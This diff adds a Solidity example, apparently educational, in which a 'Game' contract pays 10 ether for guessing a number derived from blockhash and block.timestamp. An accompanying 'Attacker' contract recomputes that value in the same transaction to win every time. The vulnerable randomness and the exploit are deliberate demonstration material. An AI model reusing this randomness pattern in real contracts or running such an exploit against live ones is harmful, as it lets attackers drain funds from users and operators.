@@ -1,0 +1,40 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.15;
+
+contract Game {
+    constructor() payable {}
+
+    function guess(uint _guess) public {
+    
+        //Generating rando number
+        uint randomNumber = uint(
+            keccak256(abi.encodePacked(blockhash(block.number), block.timestamp))
+        );
+        
+        //comparing random number with guessed number
+        if (_guess == randomNumber) {
+            (bool success, ) = msg.sender.call{value: 10 ether}("");
+            require(success, "Transaction failed");
+        }
+    }
+}
+
+
+contract Attacker {
+    receive() external payable {}
+
+    //attacker can generate same random number as blockhas and block.timestamp both are global
+    function attack(Game game) public {
+        uint randomNumber = uint(
+            keccak256(abi.encodePacked(blockhash(block.number), block.timestamp))
+        );
+
+       game.guess(randomNumber);
+    }
+
+    //function to check balance
+    
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
